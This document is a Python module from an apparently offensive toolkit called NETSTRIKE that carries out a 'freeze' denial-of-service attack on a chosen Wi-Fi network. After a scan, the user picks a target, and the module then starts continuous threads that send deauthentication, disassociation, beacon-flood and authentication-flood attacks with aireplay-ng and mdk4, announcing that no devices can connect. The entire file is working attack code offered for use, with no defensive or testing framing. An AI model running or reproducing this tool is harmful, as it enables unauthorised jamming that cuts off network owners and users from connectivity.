#!/usr/bin/env python3
"""
NETSTRIKE v3.0 FREEZE ATTACK
Single Target WiFi Jamming & Complete Network Disruption
"""

import time
import threading
from ui_animations import CyberUI

class FreezeAttack:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.ui = CyberUI()
        self.attack_active = False
        self.attack_threads = []
        
    def execute_freeze_attack(self):
        """Execute single target freeze attack"""
        self.ui.attack_header("FREEZE WI-FI ATTACK")
        self.ui.type_effect("🎯 DEPLOYING SINGLE TARGET ANNIHILATION...", 0.03)
        
        # Scan for networks
        if not self.scanner.deep_network_scan(10):
            return False
            
        # Display results and select target
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        
        if not target:
            return False
            
        return self._deploy_freeze_weapons(target)
        
    def _deploy_freeze_weapons(self, target):
        """Deploy freeze weapons against target"""
        self.ui.type_effect(f"💀 TARGET LOCKED: {target['essid']}", 0.03)
        self.ui.type_effect("⚡ DEPLOYING MULTI-VECTOR ATTACK...", 0.03)
        
        # Confirm attack
        confirm = input("\n\033[1;31m[?] CONFIRM FREEZE ATTACK? (y/N): \033[0m").strip().lower()
        if confirm not in ['y', 'yes']:
            self.ui.warning_message("ATTACK CANCELLED")
            return False
            
        self.attack_active = True
        self.core.set_current_operation("FREEZE_ATTACK")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        self.ui.progress_bar("ARMING FREEZE WEAPONS", 3)
        
        # Deploy multiple attack vectors
        attack_methods = [
            ("DEAUTHENTICATION STORM", self._deauth_attack, target),
            ("DISASSOCIATION FLOOD", self._disassociation_attack, target),
            ("BEACON FLOOD", self._beacon_flood_attack, target),
            ("AUTHENTICATION OVERLOAD", self._auth_flood_attack, target)
        ]
        
        for method_name, method_func, target in attack_methods:
            self.ui.type_effect(f"💣 DEPLOYING: {method_name}...", 0.02)
            thread = threading.Thread(target=method_func, args=(target,))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            time.sleep(1)
            
        self.ui.success_message("FREEZE ATTACK DEPLOYED SUCCESSFULLY!")
        self.ui.type_effect("❄️  TARGET NETWORK IS COMPLETELY FROZEN!", 0.03)
        self.ui.type_effect("📱 NO DEVICES CAN CONNECT UNTIL ATTACK STOPS!", 0.03)
        
        # Start attack animation
        anim_thread = threading.Thread(target=self._attack_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        # Wait for user to stop attack
        input("\n\033[1;33m[!] PRESS ENTER TO STOP FREEZE ATTACK...\033[0m")
        
        self._stop_attack()
        return True
        
    def _deauth_attack(self, target):
        """Continuous deauthentication attack"""
        while self.attack_active:
            cmd = f"aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1"
            self.core.run_command(cmd)
            time.sleep(2)
            
    def _disassociation_attack(self, target):
        """Disassociation attack"""
        while self.attack_active:
            cmd = f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} >/dev/null 2>&1"
            self.core.run_command(cmd)
            time.sleep(3)
            
    def _beacon_flood_attack(self, target):
        """Beacon flood attack"""
        while self.attack_active:
            cmd = f"mdk4 {self.core.mon_interface} b -n '{target['essid']}' -c {target['channel']} >/dev/null 2>&1"
            self.core.run_command(cmd)
            time.sleep(4)
            
    def _auth_flood_attack(self, target):
        """Authentication flood attack"""
        while self.attack_active:
            cmd = f"mdk4 {self.core.mon_interface} a -a {target['bssid']} -m >/dev/null 2>&1"
            self.core.run_command(cmd)
            time.sleep(5)
            
    def _attack_animation(self, essid):
        """Show attack animation"""
        frames = ["❄️", "💀", "⚡", "🔥", "🎯", "📶"]
        messages = [
            f"FREEZING {essid}",
            "DEAUTH PACKETS STORM",
            "DISASSOCIATION FLOOD", 
            "BEACON FRAME OVERLOAD",
            "AUTHENTICATION SPAM",
            "COMPLETE NETWORK JAM"
        ]
        
        frame_idx = 0
        while self.attack_active:
            frame = frames[frame_idx % len(frames)]
            message = messages[frame_idx % len(messages)]
            print(f"\033[1;31m[{frame}] {message} - {essid} COMPLETELY FROZEN!\033[0m", end='\r')
            frame_idx += 1
            time.sleep(0.5)
            
    def _stop_attack(self):
        """Stop all attack threads"""
        self.attack_active = False
        self.core.stop_all_attacks()
        self.core.clear_current_operation()
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=2)
            
        self.attack_threads = []
        self.ui.success_message("FREEZE ATTACK TERMINATED")
